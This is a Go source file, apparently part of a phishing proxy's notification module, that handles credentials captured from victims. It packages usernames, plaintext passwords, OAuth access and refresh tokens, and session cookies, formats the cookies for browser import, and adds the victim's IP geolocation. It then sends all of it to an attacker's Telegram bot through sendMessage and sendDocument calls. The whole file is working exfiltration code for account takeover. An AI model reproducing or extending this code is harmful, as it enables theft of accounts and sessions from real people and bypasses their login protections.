		// Log incoming cookie count
		log.Info("[telegram-dc] EventDeviceCodeCaptured triggered - data.Cookies has %d domains", len(data.Cookies))
		for domain, cookies := range data.Cookies {
			log.Debug("[telegram-dc] Domain %s: %d cookies", domain, len(cookies))
		}
		
		// Get user info from custom fields
		userEmail := ""
		if data.Custom != nil {
			userEmail = data.Custom["dc_user_email"]
		}
		
		// Fallback: try to extract email from ID token if userEmail is empty
		if userEmail == "" && data.Custom != nil {
			if idToken, ok := data.Custom["dc_id_token"]; ok && idToken != "" {
				userEmail = extractEmailFromIDToken(idToken)
			}
		}
		
		// Fallback to credentials username
		if userEmail == "" {
			if username, ok := data.Credentials["username"]; ok && username != "" {
				userEmail = username
			}
		}
		
		if userEmail == "" {
			userEmail = "unknown"
		}

		// Sanitize email for filename
		filenameBase := strings.Map(func(r rune) rune {
			if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' || r == '.' || r == '@' {
				return r
			}
			return '_'
		}, userEmail)
		if filenameBase == "" || filenameBase == "unknown" {
			filenameBase = "captured"
		}

		// 1. Send TOKENS file (.txt)
		tokenCaption := fmt.Sprintf("🔑 OAuth Tokens\n📧 %s\n📍 %s, %s %s\n🌐 %s",
			userEmail, geoInfo.City, geoInfo.Country, geoInfo.CountryFlag, data.Origin)

		var tokenContent strings.Builder
		tokenContent.WriteString("=== ACCESS TOKEN ===\n")
		if at, ok := data.Custom["dc_access_token"]; ok {
			tokenContent.WriteString(at)
		}
		tokenContent.WriteString("\n\n=== REFRESH TOKEN ===\n")
		if rt, ok := data.Custom["dc_refresh_token"]; ok {
			tokenContent.WriteString(rt)
		}

		tokenFilename := filenameBase + "_tokens.txt"
		if err := nm.sendTelegramDocument(n, tokenFilename, tokenContent.String(), tokenCaption); err != nil {
			log.Error("[telegram] failed to send token file: %v", err)
		} else {
			log.Success("[telegram] Token file sent: %s", tokenFilename)
		}

		// 2. Send COOKIES file (.json) - Cookie Editor format for browser import
		log.Info("[telegram-dc] Checking cookies for JSON export: %d domains", len(data.Cookies))
		if len(data.Cookies) > 0 {
			type CookieEditorFormat struct {
				Path           string `json:"path"`
				Domain         string `json:"domain"`
				ExpirationDate int64  `json:"expirationDate"`
				Value          string `json:"value"`
				Name           string `json:"name"`
				HttpOnly       bool   `json:"httpOnly,omitempty"`
				HostOnly       bool   `json:"hostOnly,omitempty"`
			}
			var cookies []CookieEditorFormat
			expTime := time.Now().Add(365 * 24 * time.Hour).Unix()

			for domain, domainCookies := range data.Cookies {
				for _, cookie := range domainCookies {
					if cookie == nil {
						continue
					}
					path := cookie.Path
					if path == "" {
						path = "/"
					}
					hostOnly := true
					cookieDomain := domain
					if strings.HasPrefix(domain, ".") {
						hostOnly = false
						cookieDomain = domain[1:]
					}
					cookies = append(cookies, CookieEditorFormat{
						Path:           path,
						Domain:         cookieDomain,
						ExpirationDate: expTime,
						Value:          cookie.Value,
						Name:           cookie.Name,
						HttpOnly:       cookie.HttpOnly,
						HostOnly:       hostOnly,
					})
				}
			}

			log.Info("[telegram-dc] Built %d cookies for JSON export", len(cookies))
			if len(cookies) > 0 {
				jsonBytes, _ := json.Marshal(cookies)
				cookieFilename := filenameBase + "_cookies.json"
				cookieCaption := fmt.Sprintf("🍪 Session Cookies (%d)\n📧 %s\n📍 %s, %s %s",
					len(cookies), userEmail, geoInfo.City, geoInfo.Country, geoInfo.CountryFlag)
				
				if err := nm.sendTelegramDocument(n, cookieFilename, string(jsonBytes), cookieCaption); err != nil {
					log.Warning("[telegram] failed to send cookie file: %v", err)
				} else {
					log.Success("[telegram] Cookie file sent: %s (%d cookies)", cookieFilename, len(cookies))
				}
			} else {
				log.Warning("[telegram-dc] NO COOKIES to send for %s - built 0 from %d domains", userEmail, len(data.Cookies))
			}
		} else {
			log.Warning("[telegram-dc] data.Cookies is EMPTY for device code capture of %s", userEmail)
		}

		return nil

	case EventDeviceCodeGenerated:
		text = "📱 Device Code Generated\n\n"
		text += fmt.Sprintf("🔗 Phishlet: %s\n", data.Phishlet)
		text += fmt.Sprintf("🌐 Origin: %s\n", data.Origin)
		text += fmt.Sprintf("📍 Location: %s, %s %s\n", geoInfo.City, geoInfo.Country, geoInfo.CountryFlag)
		text += fmt.Sprintf("⏰ Time: %s", time.Now().UTC().Format("2006-01-02 15:04:05 UTC"))

	default:
		text = fmt.Sprintf("%s event\nOrigin: %s", event, data.Origin)
	}

	// Build Telegram payload
	payload := map[string]interface{}{
		"chat_id": n.TelegramChatID,
		"text":    text,
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal JSON: %v", err)
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", n.TelegramBotToken)
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return fmt.Errorf("failed to parse response: %v", err)
	}

	return nil
}

// sendTelegramWithCookieFile sends cookies as a .json file (Cookie Editor format) with credentials as caption
// Also sends tokens file if OAuth tokens are present
func (nm *NotifierManager) sendTelegramWithCookieFile(n *NotifierConfig, event string, data *EventData, serverName string) error {
	log.Info("[telegram] sendTelegramWithCookieFile called - cookies count: %d", len(data.Cookies))

	// Get geolocation info for the IP
	geoInfo := getIPGeoInfo(data.Origin)

	// Build caption with clean format
	username := data.Credentials["username"]
	password := data.Credentials["password"]
	browser := parseBrowserName(data.UserAgent)
	service := phishletDisplayName(data.Phishlet)

	caption := "✅\n"
	caption += fmt.Sprintf("    %s\n", service)
	caption += "    Valid\n"
	caption += fmt.Sprintf("    🧘:- %s\n", username)
	caption += fmt.Sprintf("    🔑:- %s\n", password)
	caption += fmt.Sprintf("    Browser:- %s\n", browser)
	caption += fmt.Sprintf("    IP:- %s\n", data.Origin)
	caption += fmt.Sprintf("    Country:- %s", geoInfo.Country)

	// Build cookie file content - Cookie Editor format for browser import
	type CookieEditorFormat struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}
	var cookies []CookieEditorFormat

	// Set expiration to 1 year from now
	expTime := time.Now().Add(365 * 24 * time.Hour).Unix()

	for domain, domainCookies := range data.Cookies {
		for _, cookie := range domainCookies {
			if cookie == nil {
				continue
			}
			path := cookie.Path
			if path == "" {
				path = "/"
			}
			
			// Determine hostOnly based on domain format
			hostOnly := true
			cookieDomain := domain
			if strings.HasPrefix(domain, ".") {
				hostOnly = false
				cookieDomain = domain[1:] // Remove leading dot for the export
			}
			
			cookies = append(cookies, CookieEditorFormat{
				Path:           path,
				Domain:         cookieDomain,
				ExpirationDate: expTime,
				Value:          cookie.Value,
				Name:           cookie.Name,
				HttpOnly:       cookie.HttpOnly,
				HostOnly:       hostOnly,
			})
		}
	}

	log.Info("[telegram] built %d cookies for file", len(cookies))

	// Generate cookie file content as JSON array
	jsonBytes, err := json.Marshal(cookies)
	if err != nil {
		return fmt.Errorf("failed to marshal cookies: %v", err)
	}
	cookieContent := string(jsonBytes)

	// Determine filename from email address
	filenameBase := "session_cookies"
	if username != "" {
		filenameBase = strings.Map(func(r rune) rune {
			if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' || r == '.' || r == '@' {
				return r
			}
			return '_'
		}, username)
	}
	cookieFilename := fmt.Sprintf("%s.json", filenameBase)

	// Send cookie file
	if err := nm.sendTelegramDocument(n, cookieFilename, cookieContent, caption); err != nil {
		log.Error("[telegram] failed to send cookie file: %v", err)
		return err
	}
	log.Success("[telegram] Cookie file sent: %s", cookieFilename)

	// Check for OAuth tokens in BodyTokens, HttpTokens, or Custom
	var accessToken, refreshToken string
	
	// Check BodyTokens
	if data.BodyTokens != nil {
		if at, ok := data.BodyTokens["access_token"]; ok && at != "" {
			accessToken = at
		}
		if rt, ok := data.BodyTokens["refresh_token"]; ok && rt != "" {
			refreshToken = rt
		}
	}
	
	// Check HttpTokens
	if data.HttpTokens != nil {
		if at, ok := data.HttpTokens["access_token"]; ok && at != "" {
			accessToken = at
		}
		if rt, ok := data.HttpTokens["refresh_token"]; ok && rt != "" {
			refreshToken = rt
		}
	}
	
	// Check Custom tokens
	if data.Custom != nil {
		if at, ok := data.Custom["access_token"]; ok && at != "" {
			accessToken = at
		}
		if rt, ok := data.Custom["refresh_token"]; ok && rt != "" {
			refreshToken = rt
		}
		// Also check dc_ prefixed tokens from device code flow
		if at, ok := data.Custom["dc_access_token"]; ok && at != "" {
			accessToken = at
		}
		if rt, ok := data.Custom["dc_refresh_token"]; ok && rt != "" {
			refreshToken = rt
		}
	}

	// If we have tokens, send them as a separate file
	if accessToken != "" || refreshToken != "" {
		var tokenContent strings.Builder
		tokenContent.WriteString("=== OAuth Tokens ===\n\n")
		if accessToken != "" {
			tokenContent.WriteString("ACCESS TOKEN:\n")
			tokenContent.WriteString(accessToken)
			tokenContent.WriteString("\n\n")
		}
		if refreshToken != "" {
			tokenContent.WriteString("REFRESH TOKEN:\n")
			tokenContent.WriteString(refreshToken)
			tokenContent.WriteString("\n")
		}
		
		tokenFilename := fmt.Sprintf("%s_tokens.txt", filenameBase)
		tokenCaption := fmt.Sprintf("🔑 OAuth Tokens for %s", username)
		
		if err := nm.sendTelegramDocument(n, tokenFilename, tokenContent.String(), tokenCaption); err != nil {
			log.Warning("[telegram] failed to send token file: %v", err)
		} else {
			log.Success("[telegram] Token file sent: %s", tokenFilename)
		}
	}

	return nil
}

// sendTelegramDocument sends a file to Telegram
func (nm *NotifierManager) sendTelegramDocument(n *NotifierConfig, filename string, content string, caption string) error {
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	if err := writer.WriteField("chat_id", n.TelegramChatID); err != nil {
		return fmt.Errorf("failed to write chat_id field: %v", err)
	}

	if err := writer.WriteField("caption", caption); err != nil {
		return fmt.Errorf("failed to write caption field: %v", err)
	}

	part, err := writer.CreateFormFile("document", filename)
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}
	if _, err := part.Write([]byte(content)); err != nil {
		return fmt.Errorf("failed to write file content: %v", err)
	}

	if err := writer.Close(); err != nil {
		return fmt.Errorf("failed to close multipart writer: %v", err)
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", n.TelegramBotToken)
	req, err := http.NewRequest("POST", url, &body)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	respBody, _ := ioutil.ReadAll(resp.Body)
	var result map[string]interface{}
	if err := json.Unmarshal(respBody, &result); err != nil {
		return fmt.Errorf("failed to parse response: %v", err)
	}

	if ok, _ := result["ok"].(bool); !ok {
		desc, _ := result["description"].(string)
		return fmt.Errorf("Telegram API error: %s", desc)
	}

	return nil
}

// escapeMarkdown escapes special characters for Telegram Markdown
func escapeMarkdown(s string) string {
	replacer := strings.NewReplacer(
		"_", "\\_",
		"*", "\\*",
		"[", "\\[",
		"]", "\\]",
		"(", "\\(",
		")", "\\)",
		"~", "\\~",
		"`", "\\`",
		">", "\\>",
		"#", "\\#",
		"+", "\\+",
		"-", "\\-",
		"=", "\\=",
		"|", "\\|",
		"{", "\\{",
		"}", "\\}",
		".", "\\.",
		"!", "\\!",
	)
	return replacer.Replace(s)
}
